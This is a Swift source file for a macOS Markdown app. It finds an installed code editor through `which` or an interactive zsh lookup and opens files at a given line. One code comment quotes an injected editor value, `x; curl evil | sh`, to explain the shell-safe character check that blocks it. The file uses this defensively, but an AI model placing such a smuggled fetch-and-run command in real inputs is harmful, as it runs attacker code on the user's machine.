import Foundation
import AppKit

enum EditorLaunchError: Error {
    case noEditorFound
    case launchFailed(String)

    var message: String {
        switch self {
        case .noEditorFound:
            return "No supported editor found on $PATH. Tried: "
                + EditorLauncher.candidates.joined(separator: ", ")
                + ". Set one in Markee ▸ Settings ▸ General ▸ Editor."
        case .launchFailed(let s):
            return "Couldn't launch editor: \(s)"
        }
    }
}

enum EditorLauncher {
    /// Candidate CLI names tried in order. First one resolvable on the user's
    /// PATH wins, unless `defaults read com.markee.preview editor` is set.
    static let candidates: [String] = [
        "cursor", "code", "zed", "subl", "mate", "mvim", "hx"
    ]

    // Serial queue that serializes all reads and writes of pathCache to prevent
    // data races when availableEditors() resolves binaries off the main thread
    // concurrently with preferredEditor() on the main actor.
    private static let cacheQueue = DispatchQueue(label: "com.markee.EditorLauncher.pathCache")
    private static var pathCache: [String: String] = [:]

    /// Editor names we'll pass through `zsh -ilc 'command -v <name>'` must be
    /// shell-safe. Reject anything outside `[A-Za-z0-9._+-]` so a
    /// `defaults write … editor "x; curl evil | sh"` self-pwn isn't possible.
    private static let safeNameChars: Set<Character> = Set(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._+-"
    )

    static func isSafeEditorName(_ name: String) -> Bool {
        guard !name.isEmpty else { return false }
        return name.allSatisfy { safeNameChars.contains($0) }
    }

    /// Build the argv (excluding the binary) for opening `file` at `line` (0-indexed).
    /// Each editor's line-jump convention is different; we key on the basename
    /// of the binary so a path like `/opt/homebrew/bin/code` still dispatches.
    static func buildArgs(editor: String, file: String, line: Int?) -> [String] {
        let displayLine = (line ?? -1) + 1 // editors are 1-indexed
        let useLine = line != nil && displayLine > 0
        let key = (editor as NSString).lastPathComponent
        switch key {
        case "code", "code-insiders", "cursor", "windsurf":
            return useLine ? ["-g", "\(file):\(displayLine):1"] : [file]
        case "zed":
            return useLine ? ["\(file):\(displayLine):1"] : [file]
        case "subl", "hx":
            return useLine ? ["\(file):\(displayLine)"] : [file]
        case "mate":
            return useLine ? ["-l", "\(displayLine)", file] : [file]
        case "mvim", "gvim", "nvim", "vim":
            return useLine ? ["+\(displayLine)", file] : [file]
        default:
            return [file]
        }
    }

    /// Resolve a CLI name to an absolute path. Tries inherited PATH first,
    /// then bounces through `zsh -ilc 'command -v X'` so Homebrew / fnm / etc.
    /// shells-only PATH entries get a chance.
    static func resolveBinary(_ name: String) -> String? {
        if let cached = cacheQueue.sync(execute: { pathCache[name] }) {
            return cached.isEmpty ? nil : cached
        }
        guard isSafeEditorName(name) else {
            cacheQueue.sync { pathCache[name] = "" }
            return nil
        }

        if let p = runCapturing("/usr/bin/which", [name]),
           let trimmed = trimmedAbsolutePath(p) {
            cacheQueue.sync { pathCache[name] = trimmed }
            return trimmed
        }
        if let p = runCapturing("/bin/zsh", ["-ilc", "command -v \(name)"]),
           let trimmed = trimmedAbsolutePath(p) {
            cacheQueue.sync { pathCache[name] = trimmed }
            return trimmed
        }
        cacheQueue.sync { pathCache[name] = "" }
        return nil
    }

    /// Returns the editor the user prefers, in `(absolute-binary-path, name)` form,
    /// or nil if nothing on the candidate list resolves.
    static func preferredEditor() -> (bin: String, name: String)? {
        if let override = UserDefaults.standard.string(forKey: "editor"), !override.isEmpty {
            if let bin = resolveBinary(override) {
                return (bin, override)
            }
            // Override set but unresolvable — fall through to candidates so the
            // user isn't bricked by a typo.
        }
        for name in candidates {
            if let bin = resolveBinary(name) {
                return (bin, name)
            }
        }
        return nil
    }

    /// Resolve which candidate editors are actually installed, off the main
    /// thread (resolveBinary shells out per name). Calls back on the main queue
    /// with the installed candidate names, in candidate order.
    static func availableEditors(_ completion: @escaping ([String]) -> Void) {
        DispatchQueue.global(qos: .userInitiated).async {
            let found = candidates.filter { resolveBinary($0) != nil }
            DispatchQueue.main.async { completion(found) }
        }
    }

    /// Resolve the editor and launch it, off the main thread: resolution can
    /// shell out to an interactive login zsh (heavy `.zshrc`s take seconds).
    /// `completion` runs on the main queue.
    static func open(file: URL, line: Int?,
                     completion: @escaping (Result<Void, EditorLaunchError>) -> Void) {
        DispatchQueue.global(qos: .userInitiated).async {
            let result = launch(file: file, line: line)
            DispatchQueue.main.async { completion(result) }
        }
    }

    /// Resolve every candidate in the background so the first Open in Editor
    /// doesn't pay for the login-shell lookups.
    static func warmCache() {
        DispatchQueue.global(qos: .utility).async { _ = preferredEditor() }
    }

    private static func launch(file: URL, line: Int?) -> Result<Void, EditorLaunchError> {
        guard let preferred = preferredEditor() else {
            return .failure(.noEditorFound)
        }
        let args = buildArgs(editor: preferred.name, file: file.path, line: line)
        let task = Process()
        task.executableURL = URL(fileURLWithPath: preferred.bin)
        task.arguments = args
        do {
            try task.run()
        } catch {
            return .failure(.launchFailed(error.localizedDescription))
        }
        return .success(())
    }

    // MARK: - Helpers

    private static func trimmedAbsolutePath(_ raw: String) -> String? {
        let t = raw.trimmingCharacters(in: .whitespacesAndNewlines)
        guard t.hasPrefix("/"), !t.isEmpty else { return nil }
        // `which` returns one line; if zsh chatter snuck in, take the first
        // absolute-looking line.
        if let line = t.split(whereSeparator: { $0 == "\n" || $0 == "\r" }).first(where: { $0.hasPrefix("/") }) {
            return String(line)
        }
        return t
    }

    /// Run a lookup command and return its stdout, or nil on failure. Never
    /// hangs the caller: stdin is /dev/null (an interactive zsh can't block on
    /// a prompt), stdout is drained while the process runs (a full 64 KB pipe
    /// would otherwise deadlock it), and it's terminated after `timeout`.
    static func runCapturing(_ executable: String, _ args: [String],
                             timeout: TimeInterval = 5) -> String? {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: executable)
        p.arguments = args
        p.standardInput = FileHandle.nullDevice
        p.standardError = FileHandle.nullDevice
        let outPipe = Pipe()
        p.standardOutput = outPipe
        let exited = DispatchSemaphore(value: 0)
        p.terminationHandler = { _ in exited.signal() }
        do { try p.run() } catch { return nil }

        let output = CapturedOutput()
        let drained = DispatchSemaphore(value: 0)
        DispatchQueue.global(qos: .utility).async {
            output.data = outPipe.fileHandleForReading.readDataToEndOfFile()
            drained.signal()
        }
        if exited.wait(timeout: .now() + timeout) == .timedOut {
            p.terminate()
            return nil
        }
        // A background job the shell spawned may keep stdout open; don't wait on it.
        guard drained.wait(timeout: .now() + 1) == .success, p.terminationStatus == 0 else { return nil }
        return String(data: output.data, encoding: .utf8)
    }
}

private final class CapturedOutput: @unchecked Sendable {
    var data = Data()
}
